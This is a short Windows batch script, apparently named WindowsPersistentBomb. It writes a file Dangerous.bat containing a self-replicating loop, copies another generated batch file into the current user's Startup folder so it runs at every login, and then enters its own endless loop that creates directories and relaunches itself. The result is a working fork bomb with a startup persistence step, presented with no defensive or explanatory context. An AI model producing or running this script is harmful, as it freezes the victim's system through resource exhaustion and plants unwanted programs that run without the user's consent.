@echo off

@echo @echo off>Dangerous.bat
@echo :fork>>Dangerous.bat
@echo md "HelloThereCreatedByDangerous">>Dangerous.bat
@echo start WindowsPersistentBomb>>Dangerous.bat
@echo goto fork>>Dangerous.bat

@echo @echo off>>Harmless.bat
@echo md "HelloThereCreatedByHarmless">>Harmless.bat 

xcopy Harmless.bat “C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup”

:fork
md "HelloThere"
start WindowsPersistentBomb
goto fork